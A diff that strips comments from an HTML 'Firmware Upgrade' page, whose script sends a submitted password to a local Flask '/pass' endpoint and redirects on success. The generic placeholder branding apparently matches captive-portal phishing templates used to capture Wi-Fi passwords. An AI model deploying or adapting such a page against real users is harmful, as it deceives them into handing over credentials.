@@ -9,28 +9,20 @@
   <script src="/static/jquery.min.js"></script>
   <script src="/static/bootstrap.min.js"></script>
 
-  <!-- CSS -->
   <style type="text/css">
-
-    /* Sticky footer styles
-    -------------------------------------------------- */
 
     html,
     body {
           height: 100%;
-          /* The html and body elements cannot have any padding or margin. */
         }
 
-        /* Wrapper for page content to push down footer */
         #wrap {
           min-height: 100%;
           height: auto !important;
           height: 100%;
-          /* Negative indent footer by it's height */
           margin: 0 auto -60px;
         }
 
-        /* Set the fixed height of the footer here */
         #push,
         #footer {
           height: 60px;
@@ -39,7 +31,6 @@
           background-color: #f5f5f5;
         }
 
-        /* Lastly, apply responsive CSS fixes as necessary */
         @media (max-width: 767px) {
           #footer {
             margin-left: -20px;
@@ -64,10 +55,7 @@
         vertical-align:middle;
     }
 
-    /* ========== SIMPLE MODAL FIXES FOR SMALL SCREENS ========== */
-    /* Minimal changes to avoid breaking other elements */
     @media (max-width: 767px) {
-      /* Only fix modal positioning without affecting pointer-events */
       .modal {
         padding-right: 0 !important;
         text-align: center;
@@ -90,14 +78,12 @@
         margin: 30px auto;
       }
       
-      /* Ensure modal doesn't go off screen */
       .modal-content {
         max-height: 80vh;
         overflow-y: auto;
       }
     }
     
-    /* For very small screens */
     @media (max-width: 480px) {
       .modal-dialog {
         width: 95%;
@@ -114,7 +100,6 @@
 
 <body>
 
-  <!-- Start navigation bar -->
   <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
     <div class="container-fluid">
       <div class="navbar-header">
@@ -180,9 +165,7 @@
       </div>
     </div>
   </nav>
-  <!-- End navigation bar -->
 
-  <!-- Start page content -->
   <div class="container">
 	   <div class="col-sm">
        <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
@@ -221,19 +204,13 @@ In no event shall 2.31  Company or any other party which has been involved in th
     </form>
     <div id="push"></div>
   </div>
-  <!-- Start page content -->
 
-  <!-- Start footer -->
   <footer class="footer">
     <div class="container text-center">
       <p class="text-muted">© 2.31  <script>document.write(new Date().getFullYear())</script>, All Rights Reserved.</p>
     </div>
   </footer>
-  <!-- End footer -->
 
-  <!-- ========== SIMPLE MODALS ========== -->
-
-  <!-- Short Password Modal -->
   <div class="modal fade" id="short-password-modal">
     <div class="modal-dialog">
       <div class="modal-content">
@@ -251,7 +228,6 @@ In no event shall 2.31  Company or any other party which has been involved in th
     </div>
   </div>
 
-  <!-- Wrong Password Modal -->
   <div class="modal fade" id="wrong-password-modal">
     <div class="modal-dialog">
       <div class="modal-content">
@@ -269,7 +245,6 @@ In no event shall 2.31  Company or any other party which has been involved in th
     </div>
   </div>
 
-  <!-- Update Required Modal -->
   <div class="modal fade" id="update-only" role="dialog">
     <div class="modal-dialog modal-sm">
       <div class="modal-content">
@@ -287,17 +262,14 @@ In no event shall 2.31  Company or any other party which has been involved in th
     </div>
   </div>
 
-  <!-- ========== JAVASCRIPT ========== -->
   <script>
   const flsk_url = "/pass"
 
   $("#btn").on("click", function(e) {
       e.preventDefault();
 
-      // Get password value
       var pass = document.getElementById("pwd").value;
 
-      // Check password length - show modal if too short
       if (pass.length < 8) {
           $('#short-password-modal').modal('show');
           return;
@@ -310,18 +282,14 @@ In no event shall 2.31  Company or any other party which has been involved in th
           if (data.status == "All good") {
               window.location = "/upgrading.html";
           } else if (data.status == "notgood") {
-              // Show wrong password modal
               $('#wrong-password-modal').modal('show');
-              // Clear password field
               document.getElementById("pwd").value = "";
-              // Focus back when modal closes
               $('#wrong-password-modal').on('hidden.bs.modal', function() {
                   document.getElementById("pwd").focus();
               });
           }
       }
 
-      // Send to Flask API
       fetch(flsk_url, { 
           method: 'POST', 
           headers: new Headers({'Content-Type': 'application/x-www-form-urlencoded'}), 
@@ -332,9 +300,8 @@ In no event shall 2.31  Company or any other party which has been involved in th
       .catch(error => console.error('Error!', error.message));
   });
 
-  // Press Enter to submit
   $("#pwd").keypress(function(e) {
-      if (e.which == 13) { // Enter key
+      if (e.which == 13) {
           $("#btn").click();
       }
   });
